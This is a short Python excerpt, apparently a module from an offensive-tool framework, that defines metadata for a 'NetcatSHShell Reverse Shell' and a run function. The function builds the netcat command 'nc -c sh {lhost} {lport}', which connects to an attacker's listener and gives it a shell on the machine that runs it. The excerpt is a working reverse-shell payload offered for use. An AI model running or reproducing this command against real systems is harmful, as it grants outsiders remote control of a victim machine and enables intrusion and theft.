...
# Metadata for a Netcat "sh" shell-based reverse shell tool
metadata = {
    "name": "NetcatSHShell Reverse Shell",
    "description": "A Netcat-based reverse shell that uses a simple shell to execute commands on the remote host.",
    "authors": ["DrDataYE"],
    "date": "2023-04-01",
...
def run(args):
    ...
    netcat_command = f"nc -c sh {lhost} {lport}"
